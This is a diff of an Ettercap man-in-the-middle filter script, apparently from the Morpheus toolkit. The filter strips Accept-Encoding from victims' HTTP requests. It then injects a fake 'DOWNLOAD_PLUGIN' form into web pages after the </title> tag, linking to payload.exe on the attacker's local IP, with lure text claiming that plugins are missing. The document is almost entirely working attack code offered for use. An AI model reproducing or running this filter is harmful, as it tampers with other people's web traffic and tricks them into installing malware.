@@ -1,7 +1,6 @@
 ############################################################################
 #                                                                          #
 #  HTTPS Request/Response Filter                                           #
-#                                                                          #
 #  based on code from ALoR & NaGA                                          #
 #                                                                          #
 #  This program is free software; you can redistribute it and/or modify    #
@@ -12,35 +11,30 @@
 ############################################################################
 
 ##
-#
 #  This filter will inject one payload into target webpage request
 # 'under MitM attacks' replacing the html tag </title> by our code,
 # befor sending the webpage requested to target machine!
 # REMMENBER TO REPLACE THE 'IP ADDRESS' IN THIS EXAMPLE BY YOUR BOX 'IP ADDRESS'
-#
 ##
 
 
-#######################################
-## IFRAME.EFT FILTER TO BE COMPILED  ##
-#######################################
-##
-# Requests
+##########################
+## Zap Content Encoding ##
+##########################
 if (ip.proto == TCP && tcp.dst == 80) {
-
   if (search(DATA.data, "Accept-Encoding")) {
   replace("Accept-Encoding", "Accept-Nothing!");
+  msg("[Morpheus Filter] Encoding zapped.\n");
   }
 }
 
-
-##
-# Replace Content
+#####################
+## Replace Content ##
+#####################
 if (ip.proto == TCP && tcp.src == 80) {
+   if (search(DATA.data, "<title>")) {
+    replace("</title>", "</title><form action='http://192.168.1.67/payload.exe' method='link'><INPUT TYPE='submit' value='DOWNLOAD_PLUGIN'></form><html><body><h10>You are unable to view some of the web page’s contents. You need to download the latest plugins to fix this issue.</h10></body></html>");
 
-if (search(DATA.data, "<title>")) {
-replace("</title>", "</title><form action='http://192.168.1.67/payload.exe' method='link'><INPUT TYPE='submit' value='DOWNLOAD_PLUGIN'></form><html><body><h10>You are unable to view some of the web page’s contents. You need to download the latest plugins to fix this issue.</h10></body></html>");
-
-msg("malicious url injected into targets html request");
+    msg("[Morpheus Filter] malicious url injected...\n");
   }
 }
